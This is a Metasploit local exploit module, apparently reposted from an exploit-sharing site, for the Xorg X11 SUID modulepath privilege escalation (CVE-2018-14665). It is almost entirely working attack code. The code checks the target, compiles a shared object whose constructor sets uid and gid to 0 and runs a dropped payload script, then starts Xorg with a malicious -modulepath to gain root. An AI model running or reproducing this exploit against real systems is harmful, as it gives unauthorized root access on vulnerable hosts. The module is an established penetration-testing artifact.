# Reporting
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
 
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server SUID modulepath Privilege Escalation',
      'Description'    => %q{
        This module attempts to gain root privileges with SUID Xorg X11 server
        versions 1.19.0 < 1.20.3.
 
        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that can start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.
 
        This module has been tested with CentOS 7 (1708).
        CentOS default install will require console auth for the users session.
        Xorg must have SUID permissions and may not start if running.
 
        On successful exploitation artifacts will be created consistant
        with starting Xorg.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Narendra Shinde', # Discovery and exploit
          'Aaron Ringo',     # Metasploit module
        ],
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
           [ 'CVE', '2018-14665' ],
           [ 'BID', '105741' ],
           [ 'EDB', '45697' ],
           [ 'EDB', '45742' ],
           [ 'EDB', '45832' ],
           [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-another-way-of.html' ]
        ],
      'Platform'       =>  %w[linux unix solaris],
      'Arch'           =>  [ARCH_X86, ARCH_X64],
      'SessionTypes'   =>  %w[shell meterpreter],
      'Targets'        =>
        [
           ['Linux x64', {
            'Platform' => 'linux',
            'Arch' => ARCH_X64 } ],
           ['Linux x86', {
            'Platform' => 'linux',
            'Arch' => ARCH_X86 } ],
           ['Solaris x86', {
            'Platform' => [ 'solaris', 'unix' ],
            'Arch' => ARCH_SPARC } ],
           ['Solaris x64', {
            'Platform' => [ 'solaris', 'unix' ],
            'Arch' => ARCH_SPARC } ],
        ],
      'DefaultTarget'  => 0))
 
     register_advanced_options(
       [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
         OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ]),
         OptBool.new('ConsoleLock', [ true, 'Will check for console lock under linux', true ]),
         OptString.new('sofile', [ true, 'Xorg shared object name for modulepath', 'libglx.so' ])
       ]
     )
  end
 
 
  def check
    # linux checks
    uname = cmd_exec "uname"
    if uname =~ /linux/i
      vprint_status "Running additional check for Linux"
      if datastore['ConsoleLock']
        user = cmd_exec "id -un"
        unless exist? "/var/run/console/#{user}"
          vprint_error "No console lock for #{user}"
          return CheckCode::Safe
        end
        vprint_good "Console lock for #{user}"
      end
    end
 
    # suid program check
    xorg_path = cmd_exec "command -v Xorg"
    unless xorg_path.include?("Xorg")
      vprint_error "Could not find Xorg executable"
      return CheckCode::Safe
    end
    vprint_good "Xorg path found at #{xorg_path}"
    unless setuid? xorg_path
      vprint_error "Xorg binary #{xorg_path} is not SUID"
      return CheckCode::Safe
    end
    vprint_good "Xorg binary #{xorg_path} is SUID"
 
    x_version = cmd_exec "Xorg -version"
    if x_version.include?("Release Date")
      v = Gem::Version.new(x_version.scan(/\d\.\d+\.\d+/).first)
      unless v.between?(Gem::Version.new('1.19.0'), Gem::Version.new('1.20.2'))
        vprint_error "Xorg version #{v} not supported"
        return CheckCode::Safe
      end
    elsif x_version.include?("Fatal server error")
      vprint_error "User probably does not have console auth"
      vprint_error "Below is Xorg -version output"
      vprint_error x_version
      return CheckCode::Safe
    else
      vprint_warning "Could not parse Xorg -version output"
      return CheckCode::Appears
    end
    vprint_good "Xorg version #{v} is vulnerable"
 
    # process check for /X
    proc_list = cmd_exec "ps ax"
    if proc_list.include?('/X ')
      vprint_warning('Xorg in process list')
      return CheckCode::Appears
    end
    vprint_good('Xorg does not appear to be running')
    return CheckCode::Vulnerable
  end
 
  def check_arch_and_compile(path, data)
    cpu = ''
    if target['Arch'] == ARCH_X86
      cpu = Metasm::Ia32.new
      compile_with_metasm(cpu, path, data)
    elsif target['Arch'] == ARCH_SPARC
      compile_with_gcc(path, data)
    else
      cpu = Metasm::X86_64.new
      compile_with_metasm(cpu, path, data)
    end
  end
 
  def compile_with_metasm(cpu, path, data)
    shared_obj = Metasm::ELF.compile_c(cpu, data).encode_string(:lib)
    write_file(path, shared_obj)
    register_file_for_cleanup path
 
    chmod path
  rescue
    print_status('Failed to compile with Metasm. Falling back to compiling with GCC.')
    compile_with_gcc(path, data)
  end
 
  def compile_with_gcc(path, data)
    unless has_gcc?
      fail_with Failure::BadConfig, 'gcc is not installed'
    end
    vprint_good 'gcc is installed'
 
    src_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(6..10)}.c"
    write_file(src_path, data)
 
    gcc_cmd = "gcc -fPIC -shared -o #{path} #{src_path} -nostartfiles"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
    register_file_for_cleanup src_path
    register_file_for_cleanup path
 
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{src_path} failed to compile"
    end
 
    chmod path
  end
 
  def exploit
    check_status = check
    if check_status == CheckCode::Appears
      print_warning 'Could not get version or Xorg process possibly running, may fail'
    elsif check_status ==  CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target not vulnerable'
    end
 
    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end
 
    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end
 
    print_good 'Passed all initial checks for exploit'
 
    modulepath = datastore['WritableDir']
    sofile = "#{modulepath}/#{datastore['sofile']}"
    pscript = "#{modulepath}/.session-#{rand_text_alphanumeric 5..10}"
    xdisplay = datastore['Xdisplay']
 
    stub = %Q^
extern int setuid(int);
extern int setgid(int);
extern int system(const char *__s);
 
void _init(void) __attribute__((constructor));
 
void __attribute__((constructor))  _init() {
setgid(0);
setuid(0);
system("#{pscript} &");
  }
    ^
    print_status 'Writing launcher and compiling'
    check_arch_and_compile(sofile, stub)
 
    # Uploading
    print_status 'Uploading your payload, this could take a while'
    if payload.arch.first == 'cmd'
      write_file(pscript, payload.encoded)
    else
      write_file(pscript, generate_payload_exe)
    end
    chmod pscript
    register_file_for_cleanup pscript
 
 
    # Actual exploit with cron overwrite
    print_status 'Exploiting'
    #Xorg -logfile derp -modulepath ',/tmp' :1
    xorg_cmd = "Xorg -modulepath ',#{modulepath}' #{xdisplay} & >/dev/null"
    cmd_exec xorg_cmd
    Rex.sleep 7
    cmd_exec "pkill Xorg"
    Rex.sleep 1
  end
end
 
#  0day.today [2020-01-27]  # 
